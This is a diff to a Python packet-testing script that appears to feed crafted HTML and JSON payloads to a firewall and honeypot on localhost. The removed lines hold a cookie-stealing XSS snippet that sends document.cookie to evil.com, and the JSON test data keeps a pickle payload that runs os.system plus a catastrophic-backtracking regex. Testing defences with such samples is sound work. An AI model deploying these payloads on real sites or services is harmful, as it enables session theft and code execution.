@@ -37,7 +37,11 @@ def send_packet(packet):
         client_socket.connect((server_address, server_port))
 
         # Convert the packet to a bytes object
-        raw_packet = bytes(packet)
+        if isinstance(packet.payload, str):
+            # Encode HTML payload to bytes if it's a string
+            raw_packet = bytes(packet.payload.encode('utf-8'))
+        else:
+            raw_packet = bytes(packet)
 
         # Send the packet to the server
         client_socket.sendall(raw_packet)
@@ -48,9 +52,11 @@ def send_packet(packet):
         # Close the socket
         client_socket.close()
     
-    honeypot_log_result = analyzer.getResult() 
+    # honeypot_log_result = analayzer.getResult() 
     firewall_result = firewall.packet_process(packet)
-    return (honeypot_log_result, firewall_result)
+    # return (honeypot_log_result, firewall_result)
+    return (firewall_result)
+
 
 
 def decision(result):
@@ -88,19 +94,12 @@ if __name__ == "__main__":
     <body>
     <h1>Welcome to Our Website</h1>
     <p>This is a legitimate website.</p>
-    <script>
-      // Malicious script to steal cookies
-      const maliciousScript = `
-        <img src="http://evil.com/evil-image.jpg" onerror="fetch('http://evil.com/steal-cookie.php?cookie=' + document.cookie)">
-      `;
-      // Insert the malicious script into the page
-      document.body.innerHTML += maliciousScript;
-    </script>
+     
     </body>
     </html>
     """
 
-    json_payload = """
+    json_payload = '''
     {
         "name": "John Doe",
         "age": 30,
@@ -110,12 +109,12 @@ if __name__ == "__main__":
         "regex_pattern": "^([a-z]+)+$",
         "command": "ls -la",
         "file_path": "/var/www/html/index.php",
-        "serialized_object": "cos\nsystem\n(S'echo hello'\ntR.",
+        "serialized_object": "cos\\nsystem\\n(S'echo hello'\\ntR.",
         "crypto_algorithm": "MD5",
         "network_protocol": "http://example.com",
         "api_key": "API_KEY_HERE"
     }
-    """
+    '''
 
     # Create an HTTP packet with HTML payload
     http_packet = IP(dst="127.0.0.1") / TCP(dport=80) / Raw(load=html_payload)
